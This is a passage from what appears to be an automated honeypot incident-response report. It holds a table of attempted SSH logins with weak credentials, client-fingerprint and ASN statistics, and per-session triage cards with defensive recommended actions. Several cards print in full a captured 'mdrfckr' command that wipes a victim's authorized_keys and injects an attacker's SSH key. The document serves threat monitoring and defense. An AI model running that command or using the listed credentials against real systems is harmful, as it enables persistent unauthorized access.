| `jellyfin` | `root` | `91.92.42.19` | 2026-07-19T10:43:19 |
| `pi` | `p@ssw0rd` | `91.92.42.19` | 2026-07-19T10:43:20 |
| `packer` | `packer` | `91.92.42.19` | 2026-07-19T10:43:35 |
| `dani` | `dani` | `91.92.42.19` | 2026-07-19T10:43:52 |
| `ec2-user` | `123456` | `91.92.42.19` | 2026-07-19T10:44:04 |
| `dev` | `1qaz2wsx` | `91.92.42.19` | 2026-07-19T10:44:18 |
| `ai` | `123456` | `91.92.42.19` | 2026-07-19T10:44:31 |
| `git` | `git` | `91.92.42.19` | 2026-07-19T10:44:48 |
| `zabbix` | `zabbix` | `91.92.42.19` | 2026-07-19T10:45:02 |
| `redhat` | `redhat` | `91.92.42.19` | 2026-07-19T10:45:10 |
| `user2` | `123456` | `91.92.42.19` | 2026-07-19T10:45:31 |
| `root` | `admin1234` | `91.92.42.19` | 2026-07-19T10:45:43 |
| `agent` | `agent` | `91.92.42.19` | 2026-07-19T10:45:56 |
| `admin` | `admin!@` | `91.92.42.19` | 2026-07-19T10:46:07 |
| `deploy` | `123456` | `91.92.42.19` | 2026-07-19T10:46:19 |
| `root` | `123123` | `91.92.42.19` | 2026-07-19T10:46:33 |
| `admin` | `internet` | `10.0.0.73` | 2026-07-19T10:46:46 |
| `aiuser` | `aiuser` | `91.92.42.19` | 2026-07-19T10:46:51 |
| `root` | `0000` | `91.92.42.19` | 2026-07-19T10:47:05 |
| `erp` | `erp` | `91.92.42.19` | 2026-07-19T10:47:16 |
| `test` | `123` | `91.92.42.19` | 2026-07-19T10:47:29 |
| `adminuser` | `123456` | `91.92.42.19` | 2026-07-19T10:47:44 |
| `root` | `abc123456` | `91.92.42.19` | 2026-07-19T10:47:56 |
| `ftp` | `123456` | `91.92.42.19` | 2026-07-19T10:48:06 |
| `username` | `passwd` | `91.92.42.19` | 2026-07-19T10:48:23 |
| `support` | `123` | `91.92.42.19` | 2026-07-19T10:48:43 |
| `teste` | `teste` | `91.92.42.19` | 2026-07-19T10:48:53 |
| `mysql` | `mysql@1234` | `91.92.42.19` | 2026-07-19T10:49:02 |
| `uploader` | `uploader` | `91.92.42.19` | 2026-07-19T10:49:15 |
| `amin` | `amin` | `91.92.42.19` | 2026-07-19T10:49:28 |
| `sam` | `1234` | `91.92.42.19` | 2026-07-19T10:49:44 |
| `system` | `12345` | `91.92.42.19` | 2026-07-19T10:49:51 |
| `bin` | `smoker666` | `10.0.0.73` | 2026-07-19T10:50:06 |
| `debian` | `123456` | `91.92.42.19` | 2026-07-19T10:50:07 |
| `student` | `student123` | `91.92.42.19` | 2026-07-19T10:50:24 |
| `cloud` | `cloud` | `91.92.42.19` | 2026-07-19T10:50:30 |
| `user3` | `1` | `91.92.42.19` | 2026-07-19T10:50:45 |
| `git` | `123` | `91.92.42.19` | 2026-07-19T10:50:55 |
| `gg` | `gg` | `91.92.42.19` | 2026-07-19T10:51:10 |
| `root` | `aa123456` | `91.92.42.19` | 2026-07-19T10:51:21 |
| `root` | `Passw0rd` | `91.92.42.19` | 2026-07-19T10:51:33 |
| `lucas` | `lucas` | `91.92.42.19` | 2026-07-19T10:51:45 |
| `server` | `root` | `91.92.42.19` | 2026-07-19T10:51:59 |
| `username` | `123456` | `91.92.42.19` | 2026-07-19T10:52:10 |
| `user2` | `user2` | `91.92.42.19` | 2026-07-19T10:52:24 |
| `ubuntu` | `123456` | `91.92.42.19` | 2026-07-19T10:52:39 |
| `ubnt` | `pass` | `203.75.170.63` | 2026-07-19T10:52:45 |
| `sftpuser` | `123` | `91.92.42.19` | 2026-07-19T10:52:55 |
| `ubnt` | `pass` | `125.20.207.154` | 2026-07-19T10:52:58 |
| `pi` | `root` | `91.92.42.19` | 2026-07-19T10:53:12 |
| `sam` | `1qaz@WSX` | `91.92.42.19` | 2026-07-19T10:53:21 |
| `admin2` | `admin2` | `91.92.42.19` | 2026-07-19T10:53:33 |
| `alex` | `Ab123456` | `91.92.42.19` | 2026-07-19T10:53:53 |
| `openclaw` | `123` | `91.92.42.19` | 2026-07-19T10:54:03 |
| `ethan` | `ethan` | `91.92.42.19` | 2026-07-19T10:54:16 |
| `root` | `111111` | `91.92.42.19` | 2026-07-19T10:54:33 |
| `portal` | `portal` | `91.92.42.19` | 2026-07-19T10:54:45 |
| `default` | `1234567` | `208.109.38.143` | 2026-07-19T10:54:50 |
| `myuser` | `root` | `91.92.42.19` | 2026-07-19T10:54:52 |
| `default` | `1234567` | `31.173.0.46` | 2026-07-19T10:54:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **497** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 364 |
| OpenSSH | 39 |
| libssh | 38 |
| Paramiko (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 353 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 39 | 37 |
| `f555226df196...` | Mirai/variant | 19 | 6 |
| `16443846184e...` | Generic scanner | 4 | 1 |
| `084386fa7ae5...` | Mirai/variant | 3 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 353 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 39 | 37 | Mirai/variant |
| `f555226df196...` | libssh | 19 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 5 | — |
| `16443846184e...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 3 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `161.35.34.21`, `209.99.189.177`, `23.88.50.193`, `42.200.66.164`, `93.183.70.18`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **84** |
| Unique ASNs | **58** |
| High-Risk ASNs | **54** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 9 | MEDIUM |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (413)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7193f5969ffc

| Field | Detail |
|---|---|
| **Source IP** | `65.20.174[.]49` |
| **First Seen** | 2026-07-19 08:56 |
| **Last Seen** | 2026-07-19 08:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:56:22` | `cowrie.session.connect` |
| `2026-07-19 08:56:23` | `cowrie.client.version` |
| `2026-07-19 08:56:23` | `cowrie.client.kex` |
| `2026-07-19 08:56:27` | `cowrie.login.success` |
| `2026-07-19 08:56:28` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.174[.]49` to AbuseIPDB if not already reported
- [ ] Block `65.20.174[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beaa2444e9ed

| Field | Detail |
|---|---|
| **Source IP** | `219.248.65[.]30` |
| **First Seen** | 2026-07-19 08:59 |
| **Last Seen** | 2026-07-19 08:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:59:34` | `cowrie.session.connect` |
| `2026-07-19 08:59:35` | `cowrie.client.version` |
| `2026-07-19 08:59:35` | `cowrie.client.kex` |
| `2026-07-19 08:59:37` | `cowrie.login.success` |
| `2026-07-19 08:59:38` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.248.65[.]30` to AbuseIPDB if not already reported
- [ ] Block `219.248.65[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cacb0274cf6c

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-07-19 08:59 |
| **Last Seen** | 2026-07-19 08:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:59:48` | `cowrie.session.connect` |
| `2026-07-19 08:59:48` | `cowrie.client.version` |
| `2026-07-19 08:59:48` | `cowrie.client.kex` |
| `2026-07-19 08:59:49` | `cowrie.login.success` |
| `2026-07-19 08:59:50` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da54c2c3e776

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-07-19 09:01 |
| **Last Seen** | 2026-07-19 09:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:01:20` | `cowrie.session.connect` |
| `2026-07-19 09:01:20` | `cowrie.client.version` |
| `2026-07-19 09:01:20` | `cowrie.client.kex` |
| `2026-07-19 09:01:21` | `cowrie.login.success` |
| `2026-07-19 09:01:22` | `cowrie.session.params` |
| `2026-07-19 09:01:22` | `cowrie.command.input` |
| `2026-07-19 09:01:22` | `cowrie.command.failed` |
| `2026-07-19 09:01:22` | `cowrie.log.closed` |
| `2026-07-19 09:01:23` | `cowrie.session.params` |
| `2026-07-19 09:01:23` | `cowrie.command.input` |
| `2026-07-19 09:01:23` | `cowrie.session.file_download` |
| `2026-07-19 09:01:23` | `cowrie.log.closed` |
| `2026-07-19 09:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc3d0298827b

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-07-19 09:01 |
| **Last Seen** | 2026-07-19 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:01:23` | `cowrie.session.connect` |
| `2026-07-19 09:01:23` | `cowrie.client.version` |
| `2026-07-19 09:01:24` | `cowrie.client.kex` |
| `2026-07-19 09:01:24` | `cowrie.login.success` |
| `2026-07-19 09:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2ea2790501

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-07-19 09:01 |
| **Last Seen** | 2026-07-19 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:01:25` | `cowrie.session.connect` |
| `2026-07-19 09:01:25` | `cowrie.client.version` |
| `2026-07-19 09:01:25` | `cowrie.client.kex` |
| `2026-07-19 09:01:26` | `cowrie.login.success` |
| `2026-07-19 09:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e89dc7fbd1

| Field | Detail |
|---|---|
| **Source IP** | `93.183.70[.]18` |
| **First Seen** | 2026-07-19 09:01 |
| **Last Seen** | 2026-07-19 09:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:01:27` | `cowrie.session.connect` |
| `2026-07-19 09:01:27` | `cowrie.client.version` |
| `2026-07-19 09:01:27` | `cowrie.client.kex` |
| `2026-07-19 09:01:28` | `cowrie.login.success` |
| `2026-07-19 09:01:29` | `cowrie.session.params` |
| `2026-07-19 09:01:29` | `cowrie.command.input` |
| `2026-07-19 09:01:29` | `cowrie.command.failed` |
| `2026-07-19 09:01:29` | `cowrie.log.closed` |
| `2026-07-19 09:01:30` | `cowrie.session.params` |
| `2026-07-19 09:01:30` | `cowrie.command.input` |
| `2026-07-19 09:01:30` | `cowrie.session.file_download` |
| `2026-07-19 09:01:30` | `cowrie.log.closed` |
| `2026-07-19 09:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.183.70[.]18` to AbuseIPDB if not already reported
- [ ] Block `93.183.70[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ccabad993b

| Field | Detail |
|---|---|
| **Source IP** | `93.183.70[.]18` |
| **First Seen** | 2026-07-19 09:01 |
| **Last Seen** | 2026-07-19 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:01:30` | `cowrie.session.connect` |
| `2026-07-19 09:01:30` | `cowrie.client.version` |
| `2026-07-19 09:01:30` | `cowrie.client.kex` |
| `2026-07-19 09:01:31` | `cowrie.login.success` |
| `2026-07-19 09:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.183.70[.]18` to AbuseIPDB if not already reported
- [ ] Block `93.183.70[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe57a90f4a8

| Field | Detail |
|---|---|
| **Source IP** | `93.183.70[.]18` |
| **First Seen** | 2026-07-19 09:01 |
| **Last Seen** | 2026-07-19 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:01:31` | `cowrie.session.connect` |
| `2026-07-19 09:01:31` | `cowrie.client.version` |
| `2026-07-19 09:01:31` | `cowrie.client.kex` |
| `2026-07-19 09:01:32` | `cowrie.login.success` |
| `2026-07-19 09:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.183.70[.]18` to AbuseIPDB if not already reported
- [ ] Block `93.183.70[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26bdd169e9e5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-19 09:06 |
| **Last Seen** | 2026-07-19 09:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:06:07` | `cowrie.session.connect` |
| `2026-07-19 09:06:07` | `cowrie.client.version` |
| `2026-07-19 09:06:07` | `cowrie.client.kex` |
| `2026-07-19 09:06:07` | `cowrie.login.success` |
| `2026-07-19 09:06:07` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:06:08` | `cowrie.direct-tcpip.data` |
| `2026-07-19 09:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed5f0b8a36b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]191` |
| **First Seen** | 2026-07-19 09:06 |
| **Last Seen** | 2026-07-19 09:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:06:44` | `cowrie.session.connect` |
| `2026-07-19 09:06:45` | `cowrie.client.version` |
| `2026-07-19 09:06:45` | `cowrie.client.kex` |
| `2026-07-19 09:06:46` | `cowrie.login.success` |
| `2026-07-19 09:06:46` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]191` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15370b8c7d3c

| Field | Detail |
|---|---|
| **Source IP** | `203.110.233[.]225` |
| **First Seen** | 2026-07-19 09:06 |
| **Last Seen** | 2026-07-19 09:12 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:06:57` | `cowrie.session.connect` |
| `2026-07-19 09:06:58` | `cowrie.client.version` |
| `2026-07-19 09:06:58` | `cowrie.client.kex` |
| `2026-07-19 09:07:01` | `cowrie.login.success` |
| `2026-07-19 09:07:02` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.110.233[.]225` to AbuseIPDB if not already reported
- [ ] Block `203.110.233[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb19439633bd

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-07-19 09:07 |
| **Last Seen** | 2026-07-19 09:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:07:12` | `cowrie.session.connect` |
| `2026-07-19 09:07:13` | `cowrie.client.version` |
| `2026-07-19 09:07:13` | `cowrie.client.kex` |
| `2026-07-19 09:07:16` | `cowrie.login.success` |
| `2026-07-19 09:07:16` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-091040132f68

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 09:14 |
| **Last Seen** | 2026-07-19 09:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:14:25` | `cowrie.session.connect` |
| `2026-07-19 09:14:26` | `cowrie.client.version` |
| `2026-07-19 09:14:26` | `cowrie.client.kex` |
| `2026-07-19 09:14:28` | `cowrie.login.success` |
| `2026-07-19 09:14:29` | `cowrie.session.params` |
| `2026-07-19 09:14:29` | `cowrie.command.input` |
| `2026-07-19 09:14:30` | `cowrie.log.closed` |
| `2026-07-19 09:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-534914455281

| Field | Detail |
|---|---|
| **Source IP** | `130.185.101[.]86` |
| **First Seen** | 2026-07-19 09:20 |
| **Last Seen** | 2026-07-19 09:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:20:32` | `cowrie.session.connect` |
| `2026-07-19 09:20:32` | `cowrie.client.version` |
| `2026-07-19 09:20:32` | `cowrie.client.kex` |
| `2026-07-19 09:20:34` | `cowrie.login.success` |
| `2026-07-19 09:20:34` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.185.101[.]86` to AbuseIPDB if not already reported
- [ ] Block `130.185.101[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf35f7ebee4e

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-19 09:20 |
| **Last Seen** | 2026-07-19 09:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:20:39` | `cowrie.session.connect` |
| `2026-07-19 09:20:41` | `cowrie.client.version` |
| `2026-07-19 09:20:41` | `cowrie.client.kex` |
| `2026-07-19 09:20:45` | `cowrie.login.success` |
| `2026-07-19 09:20:46` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df23b813d31d

| Field | Detail |
|---|---|
| **Source IP** | `200.159.14[.]187` |
| **First Seen** | 2026-07-19 09:23 |
| **Last Seen** | 2026-07-19 09:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:23:32` | `cowrie.session.connect` |
| `2026-07-19 09:23:33` | `cowrie.client.version` |
| `2026-07-19 09:23:33` | `cowrie.client.kex` |
| `2026-07-19 09:23:34` | `cowrie.login.success` |
| `2026-07-19 09:23:35` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
